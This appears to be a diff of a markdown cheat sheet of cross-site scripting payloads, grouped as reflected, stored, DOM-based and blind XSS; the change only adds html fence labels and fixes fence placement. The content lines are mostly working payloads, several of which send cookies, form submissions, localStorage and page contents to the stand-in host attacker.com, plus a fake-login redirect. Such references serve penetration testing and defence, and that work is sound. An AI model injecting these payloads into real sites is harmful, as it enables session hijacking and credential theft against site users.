@@ -8,7 +8,7 @@ XSS vulnerabilities allow attackers to inject malicious scripts into web pages v
 Occurs when malicious input is immediately returned by the server in the response without proper sanitization. Requires the victim to click a malicious link.
 
 ##### Payload
-~~~<!-- Basic script injection -->
+~~~html<!-- Basic script injection -->
 <script>alert('XSS')</script>
 
 <!-- Image tag with onerror event -->
@@ -21,14 +21,15 @@ Occurs when malicious input is immediately returned by the server in the respons
 <body onload=alert('XSS')>
 
 <!-- Input tag with onfocus autofocus -->
-<input autofocus onfocus=alert('XSS')>~~~
+<input autofocus onfocus=alert('XSS')>
+~~~
 
 
 #### 2.Stored XSS (Persistent)
 Malicious script is permanently stored on the server (database, comments, user profiles) and executed when users view the infected page.
 
 ##### Payload
-~~~<!-- Stored cookie stealer -->
+~~~html<!-- Stored cookie stealer -->
 <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
 
 <!-- Keylogger payload -->
@@ -41,13 +42,14 @@ Malicious script is permanently stored on the server (database, comments, user p
 <script>window.location='https://attacker.com/fake-login'</script>
 
 <!-- Form data exfiltration -->
-<script>document.forms[0].onsubmit=function(){fetch('https://attacker.com/capture',{method:'POST',body:new FormData(this)});return false}</script>~~~
+<script>document.forms[0].onsubmit=function(){fetch('https://attacker.com/capture',{method:'POST',body:new FormData(this)});return false}</script>
+~~~
 
 #### 3.DOM-Based XSS
 Vulnerability exists in client-side JavaScript that unsafely writes user input to the DOM. The attack never reaches the server.
 
 ##### Payload
-~~~<!-- Fragment-based (location.hash) -->
+~~~html<!-- Fragment-based (location.hash) -->
 #<img src=x onerror=alert('DOM XSS')>
 
 <!-- sink: innerHTML with img tag -->
@@ -60,13 +62,14 @@ Vulnerability exists in client-side JavaScript that unsafely writes user input t
 javascript:alert('DOM XSS')
 
 <!-- AngularJS template injection (older versions) -->
-{{constructor.constructor('alert(\"XSS\")')()}}~~~
+{{constructor.constructor('alert(\"XSS\")')()}}
+~~~
 
 #### 4.Blind XSS (Bonus Category)
 Similar to stored XSS but the attacker doesn't see immediate feedback—payload executes in a different context (admin panels, logging systems).
 
 ##### Payload
-~~~<!-- Blind callback to attacker's server -->
+~~~html<!-- Blind callback to attacker's server -->
 <script>var i=new Image;i.src='https://attacker.com/blind?url='+location.href+'&cookie='+document.cookie;</script>
 
 <!-- DNS exfiltration (no HTTP request) -->
@@ -79,7 +82,8 @@ Similar to stored XSS but the attacker doesn't see immediate feedback—payload 
 <script>fetch('https://attacker.com/loot',{method:'POST',body:JSON.stringify(localStorage)})</script>
 
 <!-- XMLHttpRequest blind exfil -->
-<script>var x=new XMLHttpRequest;x.open('GET','https://attacker.com/xss?d='+btoa(document.body.innerHTML));x.send();</script>~~~
+<script>var x=new XMLHttpRequest;x.open('GET','https://attacker.com/xss?d='+btoa(document.body.innerHTML));x.send();</script>
+~~~
 
 
 
